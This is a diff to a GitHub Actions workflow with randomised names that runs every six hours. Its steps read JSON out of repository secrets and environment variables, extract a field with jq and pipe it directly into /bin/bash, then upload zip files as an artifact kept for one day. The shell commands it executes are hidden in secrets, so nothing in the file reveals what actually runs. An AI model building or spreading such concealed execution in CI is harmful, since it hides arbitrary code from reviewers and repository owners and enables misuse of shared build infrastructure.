@@ -1,20 +1,24 @@
 name: matthewui775
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '10 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: matthewui775
         env:
-          jndws96445: ${{ secrets.jndws96445 }}
+          mvu2: ${{ secrets.mvu2 }}
         run: |
-          echo $jndws96445 | jq -r .sq60038 | /bin/bash
-          echo $ye82070 | jq -r .qnwv60 | /bin/bash
-          echo $vl64358 | jq -r .fby11202 | /bin/bash
-          echo $wtvmj52 | jq -r .ppmoe133 | /bin/bash
+          printf '%s' "$mvu2" | jq -r .be0 | /bin/bash
+          echo $zqlc6022 | jq -r .e6 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Qke8Gbpo
+          path: "*.zip"
+          retention-days: 1
